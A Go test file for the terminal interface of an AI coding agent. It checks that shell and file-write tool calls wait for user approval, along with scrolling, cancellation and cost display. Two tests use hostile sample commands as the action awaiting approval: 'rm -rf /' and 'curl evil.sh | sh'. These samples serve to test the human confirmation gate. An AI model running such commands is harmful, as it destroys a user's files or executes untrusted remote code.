package tui

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	tea "github.com/charmbracelet/bubbletea"

	"github.com/ThisLonzoBall/pollington/internal/agent"
	"github.com/ThisLonzoBall/pollington/internal/config"
	"github.com/ThisLonzoBall/pollington/internal/provider"
)

// newTestModel builds a Model wired to an agent that is never asked to talk to
// a provider - these tests exercise the confirmation plumbing only.
func newTestModel(t *testing.T) (Model, *agent.Agent) {
	t.Helper()
	root := t.TempDir()
	a := agent.New(provider.New("http://unused", "k", "MiniMax-M2.7"), agent.DefaultTools(root))
	return New(a, root, config.PriceFor("MiniMax-M2.7")), a
}

func key(s string) tea.KeyMsg {
	return tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune(s)}
}

// TestConfirmRoundTrip is the important one. The agent blocks on a channel from
// a different goroutine while the update loop asks the user, so a mistake here
// deadlocks the program rather than returning a wrong answer.
func TestConfirmRoundTrip(t *testing.T) {
	for _, tc := range []struct {
		press string
		want  bool
	}{
		{"y", true},
		{"n", false},
	} {
		t.Run(tc.press, func(t *testing.T) {
			m, a := newTestModel(t)

			// Stand in for the agent goroutine calling a gated tool.
			answer := make(chan bool, 1)
			go func() { answer <- a.Confirm("write_file", "main.go (12 bytes, 1 lines)") }()

			// The update loop learns about it through the same Cmd Init uses.
			msg := waitForConfirm(m.confirmCh)()
			next, _ := m.Update(msg)
			m = next.(Model)

			if m.pending == nil {
				t.Fatal("request did not become a pending confirmation")
			}
			if view := m.View(); !strings.Contains(view, "main.go") ||
				!strings.Contains(view, "y to allow") {
				t.Errorf("prompt does not show the action:\n%s", view)
			}

			next, cmd := m.Update(key(tc.press))
			m = next.(Model)

			select {
			case got := <-answer:
				if got != tc.want {
					t.Errorf("agent saw %v, want %v", got, tc.want)
				}
			case <-time.After(2 * time.Second):
				t.Fatal("agent goroutine never unblocked - deadlock")
			}

			if m.pending != nil {
				t.Error("pending should be cleared after answering")
			}
			if cmd == nil {
				t.Error("must re-arm the listener, or the next confirmation hangs")
			}
			if last := m.lines[len(m.lines)-1]; !strings.Contains(last, "write_file") {
				t.Errorf("verdict not recorded in the transcript: %q", last)
			}
		})
	}
}

// TestPendingConfirmSwallowsInput guards against a stray keystroke landing in
// the text box while the agent sits blocked waiting for an answer.
func TestPendingConfirmSwallowsInput(t *testing.T) {
	m, a := newTestModel(t)

	answer := make(chan bool, 1)
	go func() { answer <- a.Confirm("run_shell", "rm -rf /") }()

	next, _ := m.Update(waitForConfirm(m.confirmCh)())
	m = next.(Model)

	// An unrelated key must neither resolve the prompt nor reach the input.
	next, _ = m.Update(key("q"))
	m = next.(Model)

	if m.pending == nil {
		t.Error("an unrelated key should leave the prompt standing")
	}
	if got := m.input.Value(); got != "" {
		t.Errorf("input received %q while a confirmation was pending", got)
	}

	// Enter must not submit a prompt either.
	next, _ = m.Update(tea.KeyMsg{Type: tea.KeyEnter})
	m = next.(Model)
	if m.working {
		t.Error("Enter started a turn while a confirmation was pending")
	}

	// Clean up so the goroutine is not left blocked.
	next, _ = m.Update(key("n"))
	<-answer
}

func TestEscDeclines(t *testing.T) {
	m, a := newTestModel(t)

	answer := make(chan bool, 1)
	go func() { answer <- a.Confirm("run_shell", "curl evil.sh | sh") }()

	next, _ := m.Update(waitForConfirm(m.confirmCh)())
	m = next.(Model)

	next, _ = m.Update(tea.KeyMsg{Type: tea.KeyEsc})
	m = next.(Model)

	select {
	case got := <-answer:
		if got {
			t.Error("esc must decline, not allow")
		}
	case <-time.After(2 * time.Second):
		t.Fatal("esc left the agent blocked")
	}
}

// TestDefaultToolsAreGated is a belt-and-braces check that the two destructive
// tools kept their NeedsConfirm flag.
func TestDefaultToolsAreGated(t *testing.T) {
	want := map[string]bool{
		"read_file":  false,
		"list_dir":   false,
		"write_file": true,
		"run_shell":  true,
	}
	for _, tool := range agent.DefaultTools(t.TempDir()) {
		name := tool.Def.Function.Name
		expected, known := want[name]
		if !known {
			t.Errorf("unexpected tool %q - decide whether it needs confirmation", name)
			continue
		}
		if tool.NeedsConfirm != expected {
			t.Errorf("%s: NeedsConfirm = %v, want %v", name, tool.NeedsConfirm, expected)
		}
	}
}

func TestWorkingViewShowsSpinnerVerbAndElapsed(t *testing.T) {
	m, _ := newTestModel(t)
	m.working = true
	m.verb = "Percolating"
	m.started = time.Now().Add(-42 * time.Second)

	view := m.View()
	if !strings.Contains(view, "Percolating") {
		t.Errorf("no verb in view:\n%s", view)
	}
	// Without this, a long wait is indistinguishable from a hung process.
	if !strings.Contains(view, "42s") {
		t.Errorf("no elapsed time in view:\n%s", view)
	}
}

func TestVerbRotationStopsWhenIdle(t *testing.T) {
	m, _ := newTestModel(t)

	m.working = false
	if _, cmd := m.Update(verbMsg{}); cmd != nil {
		t.Error("should not keep scheduling verb ticks once the turn is over")
	}

	m.working = true
	if _, cmd := m.Update(verbMsg{}); cmd == nil {
		t.Error("should keep rotating while working")
	}
}

func TestRollVerbAvoidsRepeating(t *testing.T) {
	m, _ := newTestModel(t)
	m.verb = verbs[0]

	for i := 0; i < 200; i++ {
		if got := m.rollVerb(); got == m.verb {
			t.Fatalf("rollVerb returned the current verb %q", got)
		}
	}
}

func TestStreamedContentAppearsWhileWorking(t *testing.T) {
	m, _ := newTestModel(t)
	m.working = true
	m.started = time.Now()

	for _, part := range []string{"Hel", "lo, ", "world"} {
		next, cmd := m.Update(agent.Event{Kind: agent.EventContent, Text: part})
		m = next.(Model)
		if cmd == nil {
			t.Fatal("must re-arm the event listener, or the stream stops after one token")
		}
	}

	if m.answer != "Hello, world" {
		t.Errorf("answer = %q", m.answer)
	}
	if view := m.View(); !strings.Contains(view, "Hello, world") {
		t.Errorf("streamed text is not on screen:\n%s", view)
	}
}

func TestStreamedReasoningIsShownAndTailLimited(t *testing.T) {
	m, _ := newTestModel(t)
	m.working = true
	m.started = time.Now()

	next, _ := m.Update(agent.Event{
		Kind: agent.EventReasoning,
		Text: "line1\nline2\nline3\nline4\nline5",
	})
	m = next.(Model)

	view := m.View()
	// Only the tail stays on screen; a thinking model can emit thousands of
	// tokens and the input box must not be pushed off the bottom.
	if strings.Contains(view, "line1") {
		t.Error("old reasoning lines should scroll out of view")
	}
	if !strings.Contains(view, "line5") {
		t.Errorf("latest reasoning missing:\n%s", view)
	}
}

func TestToolStartShowsRealActionInsteadOfVerb(t *testing.T) {
	m, _ := newTestModel(t)
	m.working = true
	m.started = time.Now()
	m.answer = "partial text"

	next, _ := m.Update(agent.Event{Kind: agent.EventToolStart, Text: "read_file main.go"})
	m = next.(Model)

	if last := m.lines[len(m.lines)-1]; !strings.Contains(last, "read_file main.go") {
		t.Errorf("tool activity not in the transcript: %q", last)
	}
	if !strings.Contains(m.verb, "read_file") {
		t.Errorf("verb = %q, want the real action", m.verb)
	}
	if m.answer != "" {
		t.Error("a tool call ends the previous answer fragment; it should be cleared")
	}
}

// TestReplyClearsStreamBuffers guards against the streamed text and the final
// committed answer both being on screen at once.
func TestReplyClearsStreamBuffers(t *testing.T) {
	m, _ := newTestModel(t)
	m.working = true
	m.answer = "streamed so far"
	m.think = "some thinking"

	next, _ := m.Update(replyMsg{text: "the final answer"})
	m = next.(Model)

	if m.answer != "" || m.think != "" {
		t.Error("live buffers should be cleared when the turn commits")
	}
	view := m.View()
	if strings.Contains(view, "streamed so far") {
		t.Errorf("streamed text shown twice:\n%s", view)
	}
	if !strings.Contains(view, "the final answer") {
		t.Errorf("final answer missing:\n%s", view)
	}
}

func TestTailLines(t *testing.T) {
	if got := tailLines("a\nb\nc\nd", 2); got != "c\nd" {
		t.Errorf("got %q, want \"c\\nd\"", got)
	}
	if got := tailLines("only", 3); got != "only" {
		t.Errorf("got %q, want \"only\"", got)
	}
	if got := tailLines("a\nb\n", 2); got != "a\nb" {
		t.Errorf("trailing newline should not count as a line: %q", got)
	}
}

// sized returns a model that has received a window size, so the viewport is
// live rather than falling back to plain line printing.
func sized(t *testing.T, w, h int) Model {
	t.Helper()
	m, _ := newTestModel(t)
	next, _ := m.Update(tea.WindowSizeMsg{Width: w, Height: h})
	return next.(Model)
}

func TestViewportTakesOverOnceSized(t *testing.T) {
	m, _ := newTestModel(t)
	if m.ready {
		t.Fatal("should not be ready before a WindowSizeMsg")
	}
	// Still renders, so the first frame is never blank.
	if !strings.Contains(m.View(), "pollington") {
		t.Error("pre-size fallback did not render the transcript")
	}

	m = sized(t, 80, 24)
	if !m.ready {
		t.Fatal("not ready after a WindowSizeMsg")
	}
	if m.vp.Height != 24-chromeHeight {
		t.Errorf("viewport height = %d, want %d", m.vp.Height, 24-chromeHeight)
	}
	if m.vp.Width != 80 {
		t.Errorf("viewport width = %d, want 80", m.vp.Width)
	}
}

// TestTranscriptDoesNotOverflowTheTerminal is the actual bug from #4: before
// the viewport, View returned every line ever printed, so a long session pushed
// the input box off the bottom of the screen.
func TestTranscriptDoesNotOverflowTheTerminal(t *testing.T) {
	const height = 24
	m := sized(t, 80, height)

	for i := 0; i < 500; i++ {
		m.push(fmt.Sprintf("line %d", i))
	}

	got := strings.Count(m.View(), "\n") + 1
	if got > height {
		t.Errorf("view is %d rows tall in a %d-row terminal", got, height)
	}
	// And the input box survived.
	if !strings.Contains(m.View(), ">") {
		t.Error("the input prompt was pushed off screen")
	}
}

func TestNewLinesScrollIntoView(t *testing.T) {
	m := sized(t, 80, 24)
	for i := 0; i < 200; i++ {
		m.push(fmt.Sprintf("line %d", i))
	}

	view := m.View()
	if !strings.Contains(view, "line 199") {
		t.Error("the newest line is not visible - the viewport did not follow the bottom")
	}
	if strings.Contains(view, "line 0") {
		t.Error("the oldest line should have scrolled away")
	}
}

func TestScrollKeysGoToTranscriptNotInput(t *testing.T) {
	m := sized(t, 80, 24)
	for i := 0; i < 200; i++ {
		m.push(fmt.Sprintf("line %d", i))
	}
	atBottom := m.vp.YOffset

	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyPgUp})
	m = next.(Model)

	if m.vp.YOffset >= atBottom {
		t.Errorf("pgup did not scroll the transcript (offset %d -> %d)", atBottom, m.vp.YOffset)
	}
	// Crucially it must not have been typed into the prompt.
	if m.input.Value() != "" {
		t.Errorf("scroll key leaked into the input: %q", m.input.Value())
	}
}

func TestOrdinaryTypingStillReachesTheInput(t *testing.T) {
	m := sized(t, 80, 24)

	for _, s := range []string{"h", "i"} {
		next, _ := m.Update(key(s))
		m = next.(Model)
	}
	if m.input.Value() != "hi" {
		t.Errorf("input = %q, want hi - routing broke normal typing", m.input.Value())
	}
}

func TestTranscriptIsBounded(t *testing.T) {
	m := sized(t, 80, 24)
	for i := 0; i < maxTranscriptLines+500; i++ {
		m.push("x")
	}
	if len(m.lines) > maxTranscriptLines {
		t.Errorf("transcript grew to %d lines, cap is %d", len(m.lines), maxTranscriptLines)
	}
}

func TestResizeKeepsTranscript(t *testing.T) {
	m := sized(t, 80, 24)
	m.push("important line")

	next, _ := m.Update(tea.WindowSizeMsg{Width: 120, Height: 40})
	m = next.(Model)

	if m.vp.Height != 40-chromeHeight {
		t.Errorf("height after resize = %d", m.vp.Height)
	}
	if !strings.Contains(m.View(), "important line") {
		t.Error("resize lost the transcript contents")
	}
}

// TestSizedInputShowsFullPlaceholder guards a bubbles quirk: with Width left at
// 0, textinput truncates its placeholder to one character, so the prompt read
// "> a" instead of inviting the user to type.
func TestSizedInputShowsFullPlaceholder(t *testing.T) {
	m, _ := newTestModel(t)
	if got := m.input.View(); strings.Contains(got, "ask pollington") {
		t.Skip("bubbles no longer truncates an unsized placeholder")
	}

	m = sized(t, 80, 24)
	if m.input.Width <= 0 {
		t.Fatalf("input width = %d, should be set from the window size", m.input.Width)
	}
	if got := m.input.View(); !strings.Contains(got, "ask pollington something") {
		t.Errorf("placeholder still truncated: %q", got)
	}
	if !strings.Contains(m.View(), "ask pollington something") {
		t.Error("full prompt not visible in the rendered frame")
	}
}

// quits reports whether a command resolves to tea's quit message.
func quits(cmd tea.Cmd) bool {
	if cmd == nil {
		return false
	}
	_, ok := cmd().(tea.QuitMsg)
	return ok
}

func TestCtrlCQuits(t *testing.T) {
	m := sized(t, 80, 24)
	if _, cmd := m.Update(tea.KeyMsg{Type: tea.KeyCtrlC}); !quits(cmd) {
		t.Error("ctrl+c must still quit")
	}
}

// TestEscNeverQuits is the point of the feature: losing a whole conversation to
// a stray keypress is worse than having a second quit key.
func TestEscNeverQuits(t *testing.T) {
	m := sized(t, 80, 24)

	// Idle.
	next, cmd := m.Update(tea.KeyMsg{Type: tea.KeyEsc})
	if quits(cmd) {
		t.Error("esc quit while idle")
	}
	m = next.(Model)

	// Mid-turn.
	m.working = true
	m.cancel = func() {}
	if _, cmd := m.Update(tea.KeyMsg{Type: tea.KeyEsc}); quits(cmd) {
		t.Error("esc quit while working")
	}
}

func TestEscCancelsTheTurnInFlight(t *testing.T) {
	m := sized(t, 80, 24)

	var cancelled bool
	m.working = true
	m.cancel = func() { cancelled = true }

	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyEsc})
	m = next.(Model)

	if !cancelled {
		t.Fatal("esc did not cancel the in-flight turn")
	}
}

func TestEscWhileIdleDoesNotCancel(t *testing.T) {
	m := sized(t, 80, 24)

	var cancelled bool
	m.working = false
	m.cancel = func() { cancelled = true }

	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyEsc})
	_ = next
	if cancelled {
		t.Error("esc cancelled a stale context while idle")
	}
}

// TestCancelledTurnReadsAsStoppedNotFailed: the user asked for it, so it should
// not look like a crash.
func TestCancelledTurnReadsAsStoppedNotFailed(t *testing.T) {
	m := sized(t, 80, 24)
	m.working = true
	m.answer = "half an answer"
	m.cancel = func() {}

	next, _ := m.Update(replyMsg{err: context.Canceled})
	m = next.(Model)

	view := m.View()
	if strings.Contains(view, "error") || strings.Contains(view, "context canceled") {
		t.Errorf("a cancellation should not read as an error:\n%s", view)
	}
	if !strings.Contains(view, "stopped") {
		t.Errorf("no indication the turn was stopped:\n%s", view)
	}
	if m.working {
		t.Error("still marked as working after the turn ended")
	}
}

// TestTurnEndReleasesTheContext guards a leak: a cancel func left uncalled
// holds the context alive for the life of the process.
func TestTurnEndReleasesTheContext(t *testing.T) {
	m := sized(t, 80, 24)

	var released bool
	m.working = true
	m.cancel = func() { released = true }

	next, _ := m.Update(replyMsg{text: "done"})
	m = next.(Model)

	if !released {
		t.Error("the turn's context was never released")
	}
	if m.cancel != nil {
		t.Error("cancel should be cleared once the turn is over")
	}
}

// TestEscAtAPromptStillDeclines: the confirmation prompt owns esc while it is
// up, which is the existing contract.
func TestEscAtAPromptDoesNotAlsoCancel(t *testing.T) {
	m, a := newTestModel(t)
	next, _ := m.Update(tea.WindowSizeMsg{Width: 80, Height: 24})
	m = next.(Model)

	var cancelled bool
	m.working = true
	m.cancel = func() { cancelled = true }

	answer := make(chan bool, 1)
	go func() { answer <- a.Confirm("run_shell", "rm -rf /") }()
	next, _ = m.Update(waitForConfirm(m.confirmCh)())
	m = next.(Model)

	next, _ = m.Update(tea.KeyMsg{Type: tea.KeyEsc})
	m = next.(Model)

	if got := <-answer; got {
		t.Error("esc at a prompt must decline")
	}
	if cancelled {
		t.Error("esc at a prompt declined the tool; it should not also kill the turn")
	}
}

// TestHeaderNamesTheProjectRoot: when the agent is anchored somewhere other
// than where you launched it, you need to be able to see that at a glance.
func TestHeaderNamesTheProjectRoot(t *testing.T) {
	m, _ := newTestModel(t)
	header := m.lines[0]

	if !strings.Contains(header, m.root) && !strings.Contains(header, shortenHome(m.root)) {
		t.Errorf("header %q does not name the root %q", header, m.root)
	}
	if !strings.Contains(header, "esc") || !strings.Contains(header, "ctrl+c") {
		t.Errorf("header should advertise both keys: %q", header)
	}
}

func TestShortenHome(t *testing.T) {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		t.Skip("no home directory")
	}
	if got := shortenHome(filepath.Join(home, "code", "proj")); got != "~/code/proj" {
		t.Errorf("got %q, want ~/code/proj", got)
	}
	if got := shortenHome("/opt/elsewhere"); got != "/opt/elsewhere" {
		t.Errorf("paths outside home should be untouched: %q", got)
	}
}

// TestStatusBarShowsRunningCost: the token counts alone do not answer the
// question people actually have, which is what this session is costing.
func TestStatusBarShowsRunningCost(t *testing.T) {
	m, a := newTestModel(t)
	a.Usage = provider.Usage{PromptTokens: 100_000, CompletionTokens: 20_000}

	view := m.View()
	if !strings.Contains(view, "in 100000") || !strings.Contains(view, "out 20000") {
		t.Errorf("token counts missing:\n%s", view)
	}
	// 100k at $0.255/M plus 20k at $1.02/M = $0.0459.
	if !strings.Contains(view, "$0.0459") {
		t.Errorf("no cost estimate in the status bar:\n%s", view)
	}
}

// TestUnknownModelShowsNoCost is the honesty half of the feature: with no rate
// for the model, a plausible-looking number is worse than nothing.
func TestUnknownModelShowsNoCost(t *testing.T) {
	root := t.TempDir()
	a := agent.New(provider.New("http://unused", "k", "mystery-model"), agent.DefaultTools(root))
	a.Usage = provider.Usage{PromptTokens: 100_000, CompletionTokens: 20_000}
	m := New(a, root, config.PriceFor("mystery-model"))

	if view := m.View(); strings.Contains(view, "$") {
		t.Errorf("a cost was shown for a model with no known rate:\n%s", view)
	}
}

func TestFormatCost(t *testing.T) {
	for _, tc := range []struct {
		in   float64
		want string
	}{
		{0, "~$0.0000"},
		{0.0459, "~$0.0459"},
		// Four decimals would round a real, if tiny, spend down to zero.
		{0.00002, "<$0.0001"},
		// Past a dollar the fourth decimal is noise.
		{12.3456, "~$12.35"},
	} {
		if got := formatCost(tc.in); got != tc.want {
			t.Errorf("formatCost(%v) = %q, want %q", tc.in, got, tc.want)
		}
	}
}
